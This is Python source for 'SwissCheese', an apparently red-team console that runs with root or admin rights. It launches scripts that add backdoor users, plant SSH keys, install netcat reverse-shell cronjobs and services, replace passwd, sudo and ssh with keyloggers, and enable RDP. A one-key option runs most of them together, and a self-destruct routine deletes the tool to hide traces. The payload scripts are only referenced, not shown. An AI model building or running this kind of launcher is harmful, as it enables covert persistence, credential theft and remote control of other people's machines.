import platform, os, ctypes, sys, subprocess, time, shutil
Logo = '''
                              mm                                    mm
 m@***@m@                     @@                        mm@***@m@@  @@
m@@    *@                                              m@@*     *@  @@
*@@@m     *@@*    m@    *@@*  @@   m@@*@@@ m@@*@@@     @@*       *  @@@@@@@m    mm@*@@   mm@*@@   m@@*@@@   mm@*@@
  *@@@@@m   @@   m@@@   m@    @@   @@   ** @@   **     @@           @@    @@   m@*   @@ m@*   @@  @@   **  m@*   @@
      *@@    @@ m@  @@ m@     !@   *@@@@@m *@@@@@m     @!m          @@    @!   !@****** !@******  *@@@@@m  !@******
@@     @@     @@@    @!!      !@        @@      @@     @!!       m  @!    @!   !@m    m !@m    m       @@  !@m    m
!     *@!     !@!!   !:!      !!   *!   @! *!   @!     !!*      *!  !!    !!   !!****** !!******  *!   @!  !!******
!!     !!     !!!    !:!      !!   !!   !! !!   !!     :!!:     !*  !:    !:   :!!      :!!       !!   !!  :!!
:!: : :!       :      :       ::    : :!:   : :!:        :: : :!    ::    ::     : : ::   : : ::   : :!:     : : ::
'''

Prompt = "SWConsole >"

###########################
#Distro Agnostic Functions#
###########################

def Print_Dictionary(dictionary):
    if isinstance(dictionary, dict):
        for key, value in dictionary.items():
            if isinstance(value, tuple):
                print(f"{key}: {value[0]}")
                #prints the key and the first value from a tuple
            else:
                print(f"{key}: {value.__name__}")
                #prints the key and the name of the value

def Run_Function(menu_items):
    while True:
        print("Menu:")
        Print_Dictionary(menu_items)
        print("exit: Exit \nhelp: Display_Help,")
        user_choice = input(Prompt)
        #takes user input to determin what function to run
        if user_choice in menu_items:
            print(f"Option {user_choice}: {menu_items[user_choice].__name__ } selected")
            #prints out a message letting the user know what option number and name was selected
            menu_items[user_choice]()
            #runs the function chosen by user input based on the os dictionarys (Linux_Main_Menu_Items or Windows_Main_Menu_Items)
        elif user_choice.lower() == "ex" or user_choice.lower() == "exit":
            Exit()
            #runs the exit function
        elif user_choice.lower() == "h" or user_choice.lower() == "help":
            Display_Help()
            #prints the help menu
        else:
            print("Invalid choice. Please try again.\n")

def Display_Help():
    with open('help.txt', 'r') as file:
        help_text = file.read()
        print(help_text)
        input("Press Enter to continue...")
        #prints help.txt and waits for the user to hit enter before proceding
def Exit():
    print("Exiting the program...")
    sys.exit()

def Run_Script(Persistance_Dict):
    Print_Dictionary(Persistance_Dict)
    print("exit: Exit this menu")
    user_choice = input(Prompt)
    if user_choice in Persistance_Dict:
        # checks if the users input is a key value
            Script_Name, Script_path = Persistance_Dict[user_choice]
            Args = {
                "Linux": ['bash'],
                "Windows": ['powershell.exe', '-ExecutionPolicy', 'Unrestricted', '-File']
            }
            subprocess.run([Args[os_name][0], Script_path])

    elif user_choice.lower() == "ex" or user_choice.lower() == "exit":
        #checks if the users input is ex or exit
        #if it is then it returns to the main menu
        Run_Function(OS_Menu)
    else:
        print("Invalid choice. Please try again.\n")

def Self_Destruct():
    SwissCheese = os.path.dirname(os.path.abspath(__file__))
    print("Self-destructing in 3")
    time.sleep(1)
    print("Self-destructing in 2")
    time.sleep(1)
    print("Self-destructing in 1")
    time.sleep(1)
    bang = """
#######
#BANG!#
#######
"""
    print (bang)
    time.sleep(1)
    shutil.rmtree(SwissCheese)
    #removes the program with a 3 second timer
    sys.exit()

def Set_RTV():
    print("Option 1: Set Red Team Variables selected")
    IP_Address = input("Enter an IP address: ")
    Port = input("Enter the port that the red team machine will listen on: ")
    User = input("Enter a username for the red team machine: ")
    #sets variables to be used in other scripts
    #ADD ERROR CHECKING
    os.environ["IP"] = IP_Address
    os.environ["Port"] = Port
    os.environ["User"] = User
    #exports variables so they can be inported on scripts

def Rip_and_Tear():
    print("Rip and Tear selected")
    os_name = platform.system()
    if os_name == "Linux":
        Scripts_to_Run = [
            "Linux/UsrAccount/UsrAdmin.sh",
            "Linux/UsrAccount/UsrR00t.sh",
            "Linux/UsrAccount/UsrSystemd.sh",
            "Linux/UsrAccount/UsrUnix.sh",
            "Linux/SSHKeys/SSHKeys.sh",
            "Linux/Cronjobs/NCReverseShellCronjob.sh",
            "Linux/Bashrc/LSAlias.sh",
            "Linux/Service/NCRevShellService.sh"
            ]
    elif os_name == "Windows":
        Scripts_to_Run = [
            'Windows\\UsrAccount\\RDPUsr.ps1',
            'Windows\\RDP\\RDPEnable.ps1'
            ]
    #defines a list of scripts to be ran based on what operating system the program is run on
    for script_path in Scripts_to_Run:
        print(f"Executing script: {script_path}")
        subprocess.run([script_path], shell=True)
        print(f"Script execution completed: {script_path}")

#################
#Linux Functions#
#################
#dictionarys are localy defined to prevent the main menu from branching into sub menus
#dictionarys are formated "<key>": ("<script name>", "<script path>"),
#then the dictionary is passed to the run script function
def User_Account_Lin():
    Linux_User_Acc = {
        "1": ("admin", "Linux/UsrAccount/UsrAdmin.sh"),
        "2": ("r00t", "Linux/UsrAccount/UsrR00t.sh"),
        "3": ("systemd", "Linux/UsrAccount/UsrSystemd.sh"),
        "4": ("unix", "Linux/UsrAccount/UsrUnix.sh"),
    }
    Run_Script(Linux_User_Acc)

def SSH_Keys_lin():
    SSH_Keys_lin = {
        "1": ("SSH keys", "Linux/SSHKeys/SSHKeys.sh"),
        }
    Run_Script(SSH_Keys_lin)

def Cronjob():

    Cronjob = {
        "1":("NC Reverse Shell", "Linux/Cronjobs/NCReverseShellCronjob.sh"),

        }
    Run_Script(Cronjob)

def Bashrc():
    Bashrc = {
        "1":("Custom Alias", "Linux/Bashrc/CustomAlias.sh"),
        "2":("Custom Bashrc Line", "Linux/Bashrc/CustomBashrcLine.sh"),
        "3":("LS Alias", "Linux/Bashrc/LSAlias.sh")
        }
    Run_Script(Bashrc)

def Service():
    Service = {
        "1":("NC Reverse Shell", "Linux/Service/NCRevShellService.sh"),
    }
    Run_Script(Service)
def Bianary_Swapping():
    Bianary_Swapping = {
        "1":("Passwd keyloger", "Linux/BianarySwapping/Passwd.sh"),
        "2":("Sudo keyloger", "Linux/BianarySwapping/Sudo.sh"),
        "3":("SSH keyloger", "Linux/BianarySwapping/SSH.sh"),
        }
    Run_Script(Bianary_Swapping)

###################
#Windows Functions#
###################
#dictionarys are localy defined to prevent the main menu from branching into sub menus
#dictionarys are formated "<key>": ("<script name>", "<script path>"),
#then the dictionary is passed to the run script function
def User_Account_Win():
    User_Account_Win = {
        "1":("Custom_User_Account", 'Windows\\UsrAccount\\CustomUsr.ps1'),
        "2":("RDPUsr", 'Windows\\UsrAccount\\RDPUsr.ps1')
        }
    Run_Script(User_Account_Win)

def RPD():
    #this function is formated difrently untill i find more rdp persistance ideas
    subprocess.run(['powershell.exe', '-ExecutionPolicy', 'Unrestricted', '-File', 'Windows\\RDP\\RDPEnable.ps1'])

#############
#Main Menues#
#############

# Define menu items and corresponding functions
Linux_Main_Menu_Items = {
    "1": Set_RTV,
    "2": User_Account_Lin,
    "3": SSH_Keys_lin,
    "4": Cronjob,
    "5": Bashrc,
    "6": Service,
    "7": Bianary_Swapping,
    "rt": Rip_and_Tear,
    "sd": Self_Destruct,
}

Windows_Main_Menu_Items = {
    "1": Set_RTV,
    "2": User_Account_Win,
    "3": RPD,
    "rt": Rip_and_Tear,
    "sd": Self_Destruct,
    }
#defines the main menu to be displayed and the required privlage level to run this script
OS_Dict = {
    "Linux": (Linux_Main_Menu_Items, "root"),
    "Windows": (Windows_Main_Menu_Items, "admin"),
}

os_name = platform.system()
#gets name of os Linux/Windows
print(Logo)

OS_Menu, Required_Privilege = OS_Dict[os_name]
#retrieves the menu items and the required privilege level from the Menu_Dict based on the current operating system (os_name)

if (os_name == "Linux" and os.getuid() == 0) or (os_name == "Windows" and ctypes.windll.shell32.IsUserAnAdmin() != 0):
    Run_Function(OS_Menu)
else:
    print(f"Error: Must run as {Required_Privilege}")
    sys.exit(1)
